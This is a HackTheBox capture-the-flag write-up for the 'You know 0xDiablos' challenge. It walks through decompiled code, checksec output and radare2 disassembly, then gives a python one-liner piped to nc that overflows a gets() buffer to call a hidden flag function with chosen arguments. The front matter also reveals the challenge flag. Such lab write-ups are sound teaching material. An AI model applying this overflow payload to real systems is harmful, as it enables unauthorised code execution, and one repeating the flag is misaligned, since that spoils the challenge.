---
description: You know 0xDiablos challenge from HackTheBox write up.
password: HTB{0ur_Buff3r_1s_not_healthy}
---

# You know 0xDiablos

The first thing I did was open the binay with Ghidra:

```c
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}


undefined4 main(void)
{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

As we can see here, the `vuln` function is using `gets`, what is vulnerable to a buffer overflow. We can also find a `flag` function that will print the flag to us when executed:

```c
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

According to radare the entrypoint for this function is: `0x080491e2`. Since the binary has no protections regarding ASLR:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/You know 0xDiablos]
└─$ checksec vuln 
[*] '/home/kali/Desktop/HTB/You know 0xDiablos/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We can create a 188 bytes payload (180 bytes for the buffer, 4 bytes for the 8 bytes alligment and 4 bytes for the EBP) followed by the `flag` function entrypoint address in little endian to overwrite the stack return pointer and make the program execute the `flag` function. Nice, now for the flag function to print the flag we need to also modify the function parameters:

```assembly
[0xf7f470b0]> pdf @sym.flag
┌ 144: sym.flag (int32_t arg_8h, int32_t arg_ch);
│           ; var int32_t var_4ch @ ebp-0x4c
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg int32_t arg_8h @ ebp+0x8
│           ; arg int32_t arg_ch @ ebp+0xc
│           0x080491e2      55             push ebp
│           0x080491e3      89e5           mov ebp, esp
│           0x080491e5      53             push ebx
│           0x080491e6      83ec54         sub esp, 0x54
│           0x080491e9      e832ffffff     call sym.__x86.get_pc_thunk.bx
│           0x080491ee      81c3122e0000   add ebx, 0x2e12
│           0x080491f4      83ec08         sub esp, 8
│           0x080491f7      8d8308e0ffff   lea eax, [ebx - 0x1ff8]
│           0x080491fd      50             push eax
│           0x080491fe      8d830ae0ffff   lea eax, [ebx - 0x1ff6]
│           0x08049204      50             push eax
│           0x08049205      e8a6feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)                                                                                                                         
│           0x0804920a      83c410         add esp, 0x10
│           0x0804920d      8945f4         mov dword [var_ch], eax
│           0x08049210      837df400       cmp dword [var_ch], 0
│       ┌─< 0x08049214      751c           jne 0x8049232
│       │   0x08049216      83ec0c         sub esp, 0xc
│       │   0x08049219      8d8314e0ffff   lea eax, [ebx - 0x1fec]
│       │   0x0804921f      50             push eax
│       │   0x08049220      e84bfeffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x08049225      83c410         add esp, 0x10
│       │   0x08049228      83ec0c         sub esp, 0xc
│       │   0x0804922b      6a00           push 0
│       │   0x0804922d      e84efeffff     call sym.imp.exit           ; void exit(int status)
│       └─> 0x08049232      83ec04         sub esp, 4
│           0x08049235      ff75f4         push dword [var_ch]
│           0x08049238      6a40           push 0x40                   ; '@' ; 64
│           0x0804923a      8d45b4         lea eax, [var_4ch]
│           0x0804923d      50             push eax
│           0x0804923e      e80dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x08049243      83c410         add esp, 0x10
│           0x08049246      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef
│       ┌─< 0x0804924d      751a           jne 0x8049269
│       │   0x0804924f      817d0c0dd0de.  cmp dword [arg_ch], 0xc0ded00d
│      ┌──< 0x08049256      7514           jne 0x804926c
│      ││   0x08049258      83ec0c         sub esp, 0xc
│      ││   0x0804925b      8d45b4         lea eax, [var_4ch]
│      ││   0x0804925e      50             push eax
│      ││   0x0804925f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x08049264      83c410         add esp, 0x10
│     ┌───< 0x08049267      eb04           jmp 0x804926d
│     ││└─> 0x08049269      90             nop
│     ││┌─< 0x0804926a      eb01           jmp 0x804926d
│     │└──> 0x0804926c      90             nop
│     │ │   ; CODE XREFS from sym.flag @ 0x8049267, 0x804926a
│     └─└─> 0x0804926d      8b5dfc         mov ebx, dword [var_4h]
│           0x08049270      c9             leave
└           0x08049271      c3             ret
```

Adding 4 bytes for the function return pointer (We don't really care) and then the values of the parameters (`0xdeadbeef` and `0xc0ded00d`) in hexadecimal and little endian will do:


```bash
python2 -c "print(b'A'*188 + b'\xe2\x91\x04\x08' + b'A'*4 + b'\xef\xbe\xad\xde' + b'\x0d\xd0\xde\xc0')" | nc <MACHINE_IP> <MACHINE_PORT>
```
